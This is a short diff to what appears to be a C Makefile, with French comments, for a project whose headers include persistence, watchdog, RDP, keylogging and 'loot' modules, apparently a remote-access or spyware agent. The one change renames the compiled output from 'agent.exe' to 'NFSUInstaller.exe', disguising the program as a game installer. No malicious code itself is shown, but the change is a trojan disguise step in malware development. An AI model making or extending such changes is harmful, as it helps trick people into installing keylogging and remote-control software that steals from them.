@@ -16,7 +16,7 @@ HEADERS = persistence.h watchdog.h rdp.h keylog.h loot.h
 OBJECTS = $(SOURCES:.c=.o)
 
 # Nom de l'exécutable
-TARGET = agent.exe
+TARGET = NFSUInstaller.exe
 
 # Flags de compilation
 CFLAGS_BASE = -O2 -Wall -Wextra
